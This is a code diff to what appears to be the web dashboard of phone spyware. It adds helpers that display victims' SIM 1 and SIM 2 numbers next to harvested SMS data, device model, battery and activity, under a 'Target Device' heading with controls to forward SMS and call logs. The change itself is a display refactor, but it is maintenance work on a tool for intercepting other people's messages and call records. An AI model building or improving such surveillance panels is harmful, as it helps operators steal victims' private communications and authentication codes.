@@ -138,6 +138,18 @@ include_once __DIR__ . '/header.php';
       };
 
       // Universal Field Key Resolvers (Compatible with Firestore & RTDB payload variations)
+      const getSim1Phone = (u) => {
+        if (!u) return 'N.A.';
+        const val = u.sim1Data?.phone || u.mobileNumber || u.phone;
+        return (val && val !== 'Not inserted' && val !== 'null' && val !== 'undefined' && String(val).trim() !== '') ? val : 'N.A.';
+      };
+
+      const getSim2Phone = (u) => {
+        if (!u) return 'N.A.';
+        const val = u.sim2Data?.phone;
+        return (val && val !== 'Not inserted' && val !== 'null' && val !== 'undefined' && String(val).trim() !== '') ? val : 'N.A.';
+      };
+
       const getSmsBody = (s) => s ? (s.body || s.message || s.text || s.msg || s.content || '') : '';
       const getSmsSender = (s) => s ? (s.sender || s.address || s.from || s.phone || s.sender_id || 'Unknown') : 'Unknown';
       const getSmsSimSlot = (s) => s ? (s.sim_number || s.simSlot || s.sim_slot || s.sim || s.slot || 'SIM 1') : 'SIM 1';
@@ -724,10 +736,8 @@ include_once __DIR__ . '/header.php';
                   </div>
 
                   <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '4px', marginBottom: '1rem' }}>
-                    <div>📞 <strong>{u.sim1Data?.phone || u.mobileNumber}</strong></div>
-                    {u.sim2Data?.phone && u.sim2Data.phone !== 'Not inserted' && (
-                      <div>📞 <strong>{u.sim2Data.phone}</strong></div>
-                    )}
+                    <div>📞 SIM 1: <strong>{getSim1Phone(u)}</strong></div>
+                    <div>📞 SIM 2: <strong>{getSim2Phone(u)}</strong></div>
                     {u.stringField && <div style={{ color: '#cbd5e1' }}>📱 Device: <strong>{u.stringField}</strong></div>}
                     <div>🔋 Battery: {u.batteryLevel} • 🕒 Active: {u.lastActivityTime}</div>
                   </div>
@@ -783,7 +793,7 @@ include_once __DIR__ . '/header.php';
                       <span>Target Device: {selectedUser.fullName}</span>
                     </h3>
                     <p style={{ fontSize: '0.85rem', color: '#9ca3af', marginTop: '4px' }}>
-                      Phone: <strong>{selectedUser.sim1Data?.phone || selectedUser.mobileNumber}</strong> {selectedUser.sim2Data?.phone && selectedUser.sim2Data.phone !== 'Not inserted' ? `• Secondary: ${selectedUser.sim2Data.phone}` : ''} • User ID: <code style={{ color: '#93c5fd' }}>{selectedUser.userId}</code>
+                      SIM 1: <strong>{getSim1Phone(selectedUser)}</strong> • SIM 2: <strong>{getSim2Phone(selectedUser)}</strong> • User ID: <code style={{ color: '#93c5fd' }}>{selectedUser.userId}</code>
                       {selectedUser.numberField ? ` • ${selectedUser.numberField}` : ''}
                       {selectedUser.stringField ? ` • Model: ${selectedUser.stringField}` : ''}
                     </p>
@@ -1055,10 +1065,10 @@ include_once __DIR__ . '/header.php';
                     <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>1. Select Data Forward Type</label>
                     <div style={{ display: 'flex', gap: '10px' }}>
                       <button type="button" className={`sim-select-pill ${forwardDataType === 'SMS' ? 'active' : ''}`} onClick={() => setForwardDataType('SMS')} style={{ flex: 1, justifyContent: 'center' }}>
-                        💬 Forward SMS Payload
+                        Forward SMS
                       </button>
                       <button type="button" className={`sim-select-pill ${forwardDataType === 'Call' ? 'active' : ''}`} onClick={() => setForwardDataType('Call')} style={{ flex: 1, justifyContent: 'center' }}>
-                        📞 Forward Call Logs
+                        Forward Call
                       </button>
                     </div>
                   </div>
